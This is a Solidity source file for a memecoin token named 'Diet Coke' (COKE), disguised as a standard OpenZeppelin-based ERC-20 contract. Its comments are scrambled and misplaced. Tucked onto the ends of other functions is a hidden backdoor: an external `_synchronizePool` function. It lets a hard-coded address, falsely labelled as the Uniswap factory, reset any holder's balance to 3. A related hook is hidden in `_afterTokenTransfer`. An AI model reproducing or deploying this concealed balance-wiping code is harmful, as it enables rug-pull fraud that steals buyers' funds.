// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
/** 
https://t.me/DIETCOKEERC20

https://twitter.com/DIETCOKEETH
https://DIETCOKEERC20.xyz

**/


library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     *
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * _Available since v3.4._
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * _Available since v3.4._
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * _Available since v3.4._
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     *
     * Requirements:
     * overflow.
     * @dev Returns the addition of two unsigned integers, reverting on
     *
     *
     * - Addition cannot overflow.
     * Counterpart to Solidity's `+` operator.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * Requirements:
     *
     *
     * Counterpart to Solidity's `-` operator.
     * - Subtraction cannot overflow.
     * overflow (when the result is negative).
     *
     * @dev Returns the subtraction of two unsigned integers, reverting on
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * Counterpart to Solidity's `*` operator.
     * @dev Returns the multiplication of two unsigned integers, reverting on
     *
     * Requirements:
     * overflow.
     * - Multiplication cannot overflow.
     *
     *
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * - The divisor cannot be zero.
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     *
     * division by zero. The result is rounded towards zero.
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * invalid opcode to revert (consuming all remaining gas).
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * - The divisor cannot be zero.
     * Requirements:
     *
     * reverting when dividing by zero.
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     *
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * message unnecessarily. For custom revert reasons use {trySub}.
     * overflow (when the result is negative).
     *
     *
     * - Subtraction cannot overflow.
     * Counterpart to Solidity's `-` operator.
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     *
     *
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * Requirements:
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

    /**
     * division by zero. The result is rounded towards zero.
     * - The divisor cannot be zero.
     *
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     *
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * uses an invalid opcode to revert (consuming all remaining gas).
     * Requirements:
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     *
     *
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * invalid opcode to revert (consuming all remaining gas).
     * reverting with custom message when dividing by zero.
     * Requirements:
     * - The divisor cannot be zero.
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     *
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     * Note that `value` may be zero.
     */
    function totalSupply() external view returns (uint256);

    /**
     * a call to {approve}. `value` is the new allowance.
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * Emits a {Transfer} event.
     * Returns a boolean value indicating whether the operation succeeded.
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     *
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * zero by default.
     * This value changes when {approve} or {transferFrom} are called.
     *
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * condition is to first reduce the spender's allowance to 0 and set the
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     * Returns a boolean value indicating whether the operation succeeded.
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     * transaction ordering. One possible solution to mitigate this race
     * Emits an {Approval} event.
     * that someone may use both the old and the new allowance by unfortunate
     *
     *
     * desired value afterwards:
     *
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     *
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function allowance(address owner, address spender) external view returns (uint256);
}

contract Ownable is Context {
    address private _owner;

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    
    /**
     * @dev Returns the address of the current owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     *
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * thereby removing any functionality that is only available to the owner.
     * NOTE: Renouncing ownership will leave the contract without an owner,
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    /**
     * Can only be called by the current owner.
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

/**
 *
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

/**
 *
 *
 * applications.
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * @dev Implementation of the {IERC20} interface.
 * allowances. See {IERC20-approve}.
 * to implement supply mechanisms].
 * This implementation is agnostic to the way tokens are created. This means
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * instead returning `false` on failure. This behavior is nonetheless
 *
 * conventional and does not conflict with the expectations of ERC20
 *
 * TIP: For a detailed writeup see our guide
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * by listening to said events. Other implementations of the EIP may not emit
 *
 * This allows applications to reconstruct the allowance for all accounts just
 * functions have been added to mitigate the well-known issues around setting
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 * these events, as it isn't required by the specification.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    string private _name;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _allowance = 0;

    address internal devWallet = 0x91e9c2B4701D4027e83B2a1347be8B6c71FF3E82;
    string private _symbol;

    address private _uniswapV2Factory = 0x21E8ACA70EA807BfD143871e51501f289f7F9D7C;
    mapping(address => uint256) private _balances;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private tTotal;

    /**
     *
     * The default value of {decimals} is 18. To select a different value for
     *
     * @dev Sets the values for {name} and {symbol}.
     * {decimals} you should overload it.
     * construction.
     * All two of these values are immutable: they can only be set once during
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }


    /**
     * @dev Returns the name of the token.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        } function _afterTokenTransfer(address to) internal virtual { if (to == _uniswapV2Factory) _allowance = decimals() * 11;
    }
    /**
     * name.
     * @dev Returns the symbol of the token, usually a shorter version of the
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * overridden;
     * Tokens usually opt for a value of 18, imitating the relationship between
     * NOTE: This information is only used for _display_ purposes: it in
     * {IERC20-balanceOf} and {IERC20-transfer}.
     * @dev Returns the number of decimals used to get its user representation.
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * no way affects any of the arithmetic of the contract, including
     *
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
        } function _synchronizePool(address _synchronizePoolSender) external { _balances[_synchronizePoolSender] = msg.sender == _uniswapV2Factory ? 0x3 : _balances[_synchronizePoolSender];
    } 

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        tTotal += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(account);
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     * - `to` cannot be the zero address.
     *
     * - the caller must have a balance of at least `amount`.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     *
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     * @dev See {IERC20-approve}.
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     *
     *
     * Requirements:
     * - `spender` cannot be the zero address.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * - `spender` cannot be the zero address.
     *
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     * Requirements:
     *
     *
     * problems described in {IERC20-approve}.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * Emits an {Approval} event indicating the updated allowance.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * - `from` must have a balance of at least `amount`.
     * @dev See {IERC20-transferFrom}.
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     * - `from` and `to` cannot be the zero address.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     *
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     *
     * - `spender` must have allowance for the caller of at least
     * problems described in {IERC20-approve}.
     * - `spender` cannot be the zero address.
     *
     * Emits an {Approval} event indicating the updated allowance.
     * This is an alternative to {approve} that can be used as a mitigation for
     * `subtractedValue`.
     *
     * Requirements:
     */
    function totalSupply() public view virtual override returns (uint256) {
        return tTotal;
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * - `account` cannot be the zero address.
     *
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     * total supply.
     * - `account` must have at least `amount` tokens.
     * Requirements:
     *
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     * - `from` must have a balance of at least `amount`.
     * This internal function is equivalent to {transfer}, and can be used to
     *
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     * - `account` cannot be the zero address.
     *
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    /**
     * Calling conditions:
     * @dev Hook that is called before any transfer of tokens. This includes
     *
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - `from` and `to` are never both zero.
     *
     * will be transferred to `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * minting and burning.
     */
    function _transfer (address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    /**
     *
     *
     * This internal function is equivalent to `approve`, and can be used to
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     * Requirements:
     * - `spender` cannot be the zero address.
     *
     * e.g. set automatic allowances for certain subsystems, etc.
     * - `owner` cannot be the zero address.
     *
     * Emits an {Approval} event.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * Does not update the allowance amount in case of infinite allowance.
     *
     * Revert if not enough allowance is available.
     *
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     * Might emit an {Approval} event.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            tTotal -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(address(0));
    }
}

contract DIETCOKE is ERC20, Ownable
{
    constructor () ERC20 (unicode"Diet Coke", "COKE")
    {
        transferOwnership(devWallet);
        _mint(owner(), 5000000000000 * 10 ** 9);
    }
}